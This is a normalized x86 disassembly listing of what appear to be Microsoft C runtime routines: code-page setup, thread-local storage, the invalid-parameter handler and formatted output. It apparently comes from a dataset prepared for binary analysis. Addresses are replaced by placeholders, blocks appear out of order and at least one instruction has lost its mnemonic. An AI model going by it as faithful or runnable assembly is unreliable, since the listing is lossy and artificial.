cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000dca2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1000dc26
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1000d98b
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000b660
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1000d95c
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_1000d9ef
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000b660
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1000d95c
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1000de87
push 0x14
push r--data
call sub_10011ecc
or [ ebp - 0x20 ] 0xffffffff
call sub_1000e343
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1000db82
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1000dc26
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_100119e5
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_10011f11
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1000dca2
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1000e8db
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1000bf59
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_1000bf59
pop ecx
push 0xd
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000dfe8
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_1000bf59
pop ecx
sub_1000e03f
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_10011bb9
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_1000e0ba
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_10011bb9
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_1000e155
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_1000e0ba
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1000e1a6
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_100128cd
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000e1e3
push 0xc
push r--data
call sub_10011ecc
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_10011bb9
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e2b8
push 0xc
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_1000c33a
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e2c1
call sub_10011f11
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1000e2ca
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1000e155
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_10011a2a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_1000bf59
pop ecx
xor esi esi
push 0x0
push esi
call sub_1000e1e3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1000e35d
push 0x8
push r--data
call sub_10011ecc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10011f11
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_1000bf59
pop ecx
push 0xd
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e477
push 0xc
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e483
push esi
call sub_1000bf59
pop ecx
push edi
call sub_1000c3c9
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_1000bf59
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1000c1f1
pop ecx
sub_1000e48c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_1000e35d
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1000e4fa
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_10011bb9
pop ecx
call sub_1000e1a6
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1000e12c
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_10011e7e
push [ rw-data ]
call sub_1000e03f
push [ rw-data ]
mov [ rw-data ] eax
call sub_1000e03f
push [ rw-data ]
mov [ rw-data ] eax
call sub_1000e03f
push [ rw-data ]
mov [ rw-data ] eax
call sub_1000e03f
add esp 0x10
mov [ rw-data ] eax
call sub_10012882
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_1000e35d
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_10011a2a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1000e1e3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_1000e687
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_1000afe5
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_10017769
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_100177c0
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000e74b
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_1000b660
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_10017377
pop ecx
sub_1000e873
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1000e0ba
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_10017377
pop ecx
pop ebp
jmp sub_1000e74b
pop ebp
jmp eax
sub_1000e899
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1000e901
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000e8ee
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1000e899
pop ecx
mov esi eax
call sub_1000e8db
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1000e924
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1001831a
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1000e8db
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1000e8db
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_100169d4
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10018191
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_100182b6
pop ecx
test eax eax
jne r-xdata
call sub_100169d4
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10018191
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1001826d
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_10017945
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1000ea88
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_1000e924
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_1000eabb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_1000ea88
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_1000eae1
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_1000ea88
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_1000e8db
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_1000ea88
sub_1000eb2e
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_1000afe5
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1000e8db
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_1001831a
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_1000f6c6
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x4
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_10011ac4
add esp 0xc
test eax eax
je r-xdata
call sub_10011a2a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
mov eax [ esi ]
add eax eax
push eax
push [ ebp + 0xc ]
push [ edi ]
call sub_1000ac80
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_1000f720
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0xff00
push esi
jne r-xdata
movzx eax [ ebp + 0x8 ]
and eax 0xffffffdf
sub eax 0x7
movzx esi [ ebp + 0x8 ]
mov eax esi
and eax 0xff
push eax
call sub_10018646
pop ecx
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
sub_1000f76e
mov edi edi
push ebp
mov ebp esp
push edi
mov ax di
pop edi
pop ebp
retn
push 0x8
push edi
call sub_1001784a
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
inc [ esi ]
call sub_100186fa
movzx edi ax
mov eax 0xffff
pop ecx
cmp di ax
je r-xdata
sub_1000f7a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x340
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x324 ] ecx
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x2dc ] eax
mov [ ebp - 0x2e4 ] ecx
mov [ ebp - 0x314 ] 0x15e
mov [ ebp - 0x310 ] esi
mov [ ebp - 0x30c ] esi
mov [ ebp - 0x328 ] esi
mov [ ebp - 0x2cc ] esi
cmp edi esi
jne r-xdata
cmp eax esi
je r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x33c ]
call sub_1000afe5
movzx eax [ edi ]
mov [ ebp - 0x2dd ] 0x0
mov [ ebp - 0x2c8 ] esi
mov [ ebp - 0x308 ] esi
cmp ax si
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
cmp [ ebp - 0x330 ] 0x0
je r-xdata
push ebx
mov eax [ ebp - 0x308 ]
mov eax [ ebp - 0x334 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ edi ]
push 0x25
pop ecx
mov edx ecx
cmp dx ax
jne r-xdata
push [ ebp - 0x2dc ]
dec [ ebp - 0x2c8 ]
push [ ebp - 0x2dc ]
lea esi [ ebp - 0x2c8 ]
call sub_1000f76e
movzx eax ax
pop ecx
push eax
call sub_1000f756
pop ecx
pop ecx
mov edx ecx
cmp dx ax
jne r-xdata
cmp dx [ edi + 0x2 ]
je r-xdata
inc edi
inc edi
movzx eax [ edi ]
push 0x8
push eax
call sub_1001784a
